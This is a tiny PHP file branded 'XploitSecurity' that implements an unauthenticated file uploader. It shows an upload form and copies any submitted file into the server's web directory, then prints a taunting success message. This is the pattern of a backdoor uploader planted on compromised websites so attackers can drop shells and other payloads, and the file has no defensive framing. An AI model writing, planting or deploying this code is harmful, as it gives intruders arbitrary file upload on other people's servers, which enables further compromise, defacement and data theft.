<center>
	<i><h3>XploitSecurity</h3>
<h1><?php if($_POST){ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>LET GO THERE:V</b>-->".$_FILES["f"]["name"]; }else{ echo"<b>Failed !!"; } }else{ echo "<form method=post enctype=multipart/form-data><input type=file name=f><input name=v type=submit id=v value=Upload> <br>"; }__halt_compiler();?></h1>
